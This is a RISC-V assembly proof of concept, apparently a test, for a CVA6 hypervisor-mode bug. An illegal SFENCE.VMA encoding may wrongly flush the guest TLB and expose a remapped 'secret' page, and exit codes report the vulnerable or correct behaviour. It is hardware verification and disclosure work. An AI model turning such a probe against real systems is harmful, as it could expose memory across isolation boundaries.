/*
 * CVA6 VS-mode invalid SFENCE.VMA security PoC
 *
 * The VS guest first fills a translation for TARGET_VA, then rewrites the VS
 * page table so TARGET_VA points at secret_page.  A control load before the
 * invalid instruction must still see old_page, proving that the stale
 * translation is still active.
 *
 * Correct behavior:
 *   .word 0x120000f3 is an illegal SFENCE.VMA encoding because rd=x1.
 *   The M-mode trap handler sees the illegal instruction and exits 0.
 *
 * Vulnerable CVA6 behavior:
 *   The invalid instruction retires as SFENCE_VMA, flushes the VS TLB, and the
 *   following load observes secret_page.  The PoC copies SECRET_WORD to
 *   attacker_buffer and exits 31.
 */
.option push
.option norelax
.option norvc

.equ CSR_HSTATUS,        0x600
.equ CSR_HEDELEG,        0x602
.equ CSR_HIDELEG,        0x603
.equ CSR_HGATP,          0x680
.equ CSR_VSATP,          0x280

.equ MISA_H,             0x80
.equ SATP_SV39,          0x8000000000000000
.equ PMP_RWX_NAPOT,      0x1f

.equ MSTATUS_MPP,        0x00001800
.equ MSTATUS_MPP_S,      0x00000800
.equ HSTATUS_SPV,        0x00000080
.equ SSTATUS_SPP,        0x00000100

.equ PTE_V,              0x001
.equ PTE_R,              0x002
.equ PTE_W,              0x004
.equ PTE_X,              0x008
.equ PTE_A,              0x040
.equ PTE_D,              0x080
.equ PTE_TABLE,          PTE_V
.equ PTE_RWXAD,          (PTE_V | PTE_R | PTE_W | PTE_X | PTE_A | PTE_D)
.equ PTE_RAD,            (PTE_V | PTE_R | PTE_A | PTE_D)

.equ TEXT_VA,            0x0000000080000000
.equ TARGET_VA,          0x0000000040000000
.equ OLD_WORD,           0x1111222233334444
.equ SECRET_WORD,        0x5ec0c0decafe3131
.equ REG_SENTINEL,       0x123456789abcdef0
.equ CAUSE_ILLEGAL,      2

.equ ROOT_TEXT_IDX,      ((TEXT_VA   >> 30) & 0x1ff)
.equ ROOT_TARGET_IDX,    ((TARGET_VA >> 30) & 0x1ff)
.equ L1_TARGET_IDX,      ((TARGET_VA >> 21) & 0x1ff)
.equ L0_TARGET_IDX,      ((TARGET_VA >> 12) & 0x1ff)

.macro EXIT code
  li   a0, \code
  la   t5, tohost
  slli t6, a0, 1
  ori  t6, t6, 1
  sd   t6, 0(t5)
  fence
  .word 0x0005006b
1:
  j 1b
.endm

.macro MAKE_PTE dst, page, flags
  la   \dst, \page
  srli \dst, \dst, 12
  slli \dst, \dst, 10
  ori  \dst, \dst, \flags
.endm

.section .text.init, "ax"
.globl _start
_start:
  la   t0, m_trap
  csrw mtvec, t0

  csrw mie, zero
  csrci mstatus, 0x8
  csrw medeleg, zero
  csrw mideleg, zero
  csrw CSR_HEDELEG, zero
  csrw CSR_HIDELEG, zero
  csrw satp, zero
  csrw CSR_HGATP, zero
  csrw CSR_VSATP, zero

  li   t0, -1
  csrw pmpaddr0, t0
  li   t0, PMP_RWX_NAPOT
  csrw pmpcfg0, t0

  csrr t0, misa
  li   t1, MISA_H
  and  t0, t0, t1
  beqz t0, no_h_extension

  call setup_vs_page_tables

  la   t0, vs_root_pt
  srli t0, t0, 12
  li   t1, SATP_SV39
  or   t0, t0, t1
  csrw CSR_VSATP, t0
  csrw CSR_HGATP, zero
  sfence.vma x0, x0

  li   t0, MSTATUS_MPP
  csrc mstatus, t0
  li   t0, MSTATUS_MPP_S
  csrs mstatus, t0
  la   t0, hs_entry
  csrw mepc, t0
  mret

  EXIT 93

setup_vs_page_tables:
  la   t0, vs_root_pt

  li   t1, TEXT_VA
  srli t1, t1, 12
  slli t1, t1, 10
  ori  t1, t1, PTE_RWXAD
  sd   t1, (ROOT_TEXT_IDX * 8)(t0)

  MAKE_PTE t1, target_l1_pt, PTE_TABLE
  sd   t1, (ROOT_TARGET_IDX * 8)(t0)

  la   t0, target_l1_pt
  MAKE_PTE t1, target_l0_pt, PTE_TABLE
  sd   t1, (L1_TARGET_IDX * 8)(t0)

  la   t0, target_l0_pt
  MAKE_PTE t1, old_page, PTE_RAD
  sd   t1, (L0_TARGET_IDX * 8)(t0)
  ret

.align 2
hs_entry:
  csrw CSR_HSTATUS, zero
  li   t0, HSTATUS_SPV
  csrs CSR_HSTATUS, t0

  li   t0, SSTATUS_SPP
  csrs sstatus, t0

  la   t0, vs_entry
  csrw sepc, t0
  sret

  EXIT 90

.align 2
.globl vs_entry
vs_entry:
  li   t0, TARGET_VA
  ld   t1, 0(t0)
  li   t2, OLD_WORD
  bne  t1, t2, fail_first_read

  la   t3, target_l0_pt
  MAKE_PTE t4, secret_page, PTE_RAD
  sd   t4, (L0_TARGET_IDX * 8)(t3)
  fence rw, rw

  li   t0, TARGET_VA
  ld   t1, 0(t0)
  li   t2, OLD_WORD
  bne  t1, t2, fail_no_stale_before_sfence

  li   ra, REG_SENTINEL

.globl bad_sfence_vs
bad_sfence_vs:
  .word 0x120000f3

  la   t0, rd_after_bad_sfence
  sd   ra, 0(t0)

  li   t0, TARGET_VA
  ld   t1, 0(t0)
  li   t2, SECRET_WORD
  beq  t1, t2, leak_secret_after_invalid_sfence

  li   t2, OLD_WORD
  beq  t1, t2, fail_accepted_without_flush
  EXIT 33

leak_secret_after_invalid_sfence:
  la   t0, attacker_buffer
  sd   t1, 0(t0)
  fence rw, rw
  EXIT 31

fail_first_read:
  EXIT 35

fail_no_stale_before_sfence:
  EXIT 34

fail_accepted_without_flush:
  EXIT 32

.align 2
m_trap:
  csrr t0, mcause
  li   t1, CAUSE_ILLEGAL
  bne  t0, t1, fail_wrong_cause

  csrr t0, mepc
  la   t1, bad_sfence_vs
  bne  t0, t1, fail_wrong_epc

  la   t0, attacker_buffer
  ld   t1, 0(t0)
  bnez t1, fail_buffer_modified

  EXIT 0

no_h_extension:
  EXIT 91

fail_wrong_cause:
  csrr a0, mcause
  addi a0, a0, 100
  la   t5, tohost
  slli t6, a0, 1
  ori  t6, t6, 1
  sd   t6, 0(t5)
  fence
  .word 0x0005006b
1:
  j 1b

fail_wrong_epc:
  EXIT 92

fail_buffer_modified:
  EXIT 41

.section .data, "aw"
.align 12
old_page:
  .dword OLD_WORD
  .zero 4088

.align 12
secret_page:
  .dword SECRET_WORD
  .zero 4088

.align 3
attacker_buffer:
  .dword 0

.align 3
rd_after_bad_sfence:
  .dword 0

.section .data.pt, "aw"
.align 12
vs_root_pt:
  .zero 4096

.align 12
target_l1_pt:
  .zero 4096

.align 12
target_l0_pt:
  .zero 4096

.section .tohost, "aw"
.align 3
.globl tohost
tohost:
  .dword 0

.globl fromhost
fromhost:
  .dword 0

.option pop
